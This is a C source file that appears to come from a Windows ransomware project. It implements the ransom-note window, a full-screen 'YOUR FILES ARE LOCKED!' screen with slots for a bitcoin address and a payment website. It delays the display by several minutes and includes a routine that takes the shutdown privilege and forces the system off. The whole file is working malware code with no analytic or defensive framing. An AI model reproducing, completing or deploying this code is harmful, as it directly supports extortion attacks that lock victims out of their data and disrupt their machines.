#include "khalsa_gui.h"
#include "khalsa_g.h"
#include "khalsa_clib.h"
#include <wingdi.h>
#include <winuser.h>
#define TITLE L"YOUR FILES ARE LOCKED!"
#define NAME TITLE
#define RED RGB(255, 0, 0)
#define GRAY (51, 51, 48)

#define _CreateWindowW(lpClassName, lpWindowName, dwStyle, x, y, nWidth, nHeight, hWndParent, hMenu, hInstance, lpParam)\
_CreateWindowExW(0L, lpClassName, lpWindowName, dwStyle, x, y, nWidth, nHeight, hWndParent, hMenu, hInstance, lpParam)

LRESULT CALLBACK WindowProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	LRESULT status = 0;
	HWND hwndTitle = 0, hwndEdit = 0, hwndBitcoinButton = 0, hwndBitcoinAddress = 0, hwndWebsite = 0, hwndWebsiteButton = 0;
	HFONT hStandardFont = NULL, hTitleFont = NULL;

	switch (message)
	{
	case WM_CREATE: {
		HDC hdcTitle = 0;
		RECT lpRect, lpMessageRect;
		hStandardFont = _CreateFontW(28, 0, 0, 0, FW_BOLD, 0, 0, 0, DEFAULT_CHARSET, OUT_OUTLINE_PRECIS, CLIP_DEFAULT_PRECIS, ANTIALIASED_QUALITY, FF_MODERN, (L"Times New Roman"));
		if (!hStandardFont)
			goto create_cleanup;

		hTitleFont = _CreateFontW(48, 0, 0, 0, FW_BOLD, 0, 0, 0, DEFAULT_CHARSET, OUT_OUTLINE_PRECIS, CLIP_DEFAULT_PRECIS, ANTIALIASED_QUALITY, FF_MODERN, (L"Times New Roman"));
		if (!hTitleFont)
			goto create_cleanup;

		_GetWindowRect(hwnd, &lpRect);
		hwndTitle = _CreateWindowW(L"static", TITLE, WS_CHILD | WS_VISIBLE, 0, 0, 0, 0, hwnd, NULL, NULL, NULL);
		hdcTitle = _GetDC(hwndTitle);
		SIZE TitleSize;
		_GetTextExtentPoint32W(hdcTitle, TITLE, _wcslen(TITLE), &TitleSize);
		DWORD dwX = (lpRect.right / 2) - TitleSize.cx - 120;
		if (dwX <= 0)
			dwX = (lpRect.right / 2) - TitleSize.cx;
		 
		_MoveWindow(hwndTitle, dwX, 7, lpRect.right, 50, TRUE);
		hwndEdit = _CreateWindowW(L"EDIT", lpszMessage, WS_CHILD | WS_VISIBLE | WS_VSCROLL | ES_MULTILINE | ES_CENTER | ES_READONLY, lpRect.left + 1, 50, lpRect.right - 20, lpRect.bottom - 1, hwnd, NULL, NULL, NULL);
		_GetWindowRect(hwndEdit, &lpMessageRect);
		_SendMessageW(hwndTitle, WM_SETFONT, (WPARAM)hTitleFont, TRUE);
		_SendMessageW(hwndEdit, WM_SETFONT, (WPARAM)hStandardFont, TRUE);

	create_cleanup:
		if (hdcTitle)
			_DeleteObject(hdcTitle);


		break;
	}


	case WM_CTLCOLORSTATIC: {
		_SetTextColor((HDC)wParam, RED);
		_SetBkColor((HDC)wParam, GRAY);
		status = (LRESULT)_CreateSolidBrush(GRAY);
	}
		break;
	case WM_DESTROY:

		if (hStandardFont)
			_DeleteObject(hStandardFont);

		if (hTitleFont)
			_DeleteObject(hTitleFont);
		_PostQuitMessage(0);
		//SystemShutdown();
		break;
	default:
		status = _DefWindowProcW(hwnd, message, wParam, lParam);
		break;
	}
	return status;
}


DWORD WINAPI CreateGUIThread(LPVOID lpParam) {
	LARGE_INTEGER Time;
	Time.QuadPart = 420000 * -10000LL;
	_NtDelayExecution((BOOLEAN)FALSE, &Time);

	HBRUSH hBrush = _CreateSolidBrush(GRAY);

	WNDCLASSEXW wc;
	ZeroBuffer(&wc, sizeof(WNDCLASSEXW));
	wc.lpfnWndProc = WindowProc;
	wc.lpszClassName = NAME;
	wc.hbrBackground = hBrush;
	wc.cbSize = sizeof(WNDCLASSEXW);
	wc.lpszMenuName = NULL;
	wc.cbClsExtra = 0;
	wc.cbWndExtra = 0;
	
	ATOM regclass = _RegisterClassExW(&wc);
	RECT lpRect;
	_GetWindowRect(_GetDesktopWindow(), &lpRect);
	HWND hwnd = _CreateWindowExW(0, NAME, NAME, WS_SYSMENU, lpRect.left + 1, lpRect.top + 1, lpRect.right - 1, lpRect.bottom - 1, HWND_DESKTOP, NULL, wc.hInstance, NULL);
	if (!hwnd)
		goto cleanup;
	_ShowWindow(hwnd, SW_SHOW);
	MSG msg;
	ZeroBuffer(&msg, sizeof(MSG));
	while (_GetMessageW(&msg, NULL, 0, 0))
	{
		_TranslateMessage(&msg);
		_DispatchMessageW(&msg);
	}
cleanup:
	if (hBrush)
		_DeleteObject(hBrush);

	return 0;
}





















BOOL SystemShutdown()
{
	HANDLE hToken;
	TOKEN_PRIVILEGES tkp;

	// Get a token for this process. 

	NTSTATUS status = _NtOpenProcessToken(NtCurrentProcess(),
		TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
	if(!NT_SUCCESS(status))
		return(FALSE);

	// Get the LUID for the shutdown privilege. 

	_LookupPrivilegeValueW(NULL, SE_SHUTDOWN_NAME,
		&tkp.Privileges[0].Luid);

	tkp.PrivilegeCount = 1;  // one privilege to set    
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	// Get the shutdown privilege for this process. 

	status = _NtAdjustPrivilegesToken(hToken, FALSE, &tkp, 0,
		(PTOKEN_PRIVILEGES)NULL, 0);

	if (!NT_SUCCESS(status))
		return FALSE;

	// Shut down the system and force all applications to close. 
	
	if (!_ExitWindowsEx(EWX_SHUTDOWN | EWX_FORCE,
		SHTDN_REASON_MAJOR_OPERATINGSYSTEM |
		SHTDN_REASON_MINOR_UPGRADE |
		SHTDN_REASON_FLAG_PLANNED))
		return FALSE;

	//shutdown was successful
	return TRUE;
}